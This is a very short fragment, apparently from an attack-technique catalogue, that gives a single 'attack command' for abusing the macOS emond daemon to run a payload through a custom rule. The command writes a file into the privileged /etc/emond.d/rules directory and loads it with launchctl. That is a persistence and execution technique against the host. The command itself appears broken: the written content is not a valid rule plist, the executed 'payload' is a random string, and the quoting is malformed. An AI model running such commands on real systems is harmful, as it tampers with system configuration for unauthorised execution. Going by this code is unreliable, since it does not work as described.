...
# Abusing emond on macOS to execute payload via custom rule.
...
## Attack Command
```
echo 'command=/bin/zsh -c "$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh"' > /etc/emond.d/rules/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist && launchctl load /etc/emond.d/rules/*
```
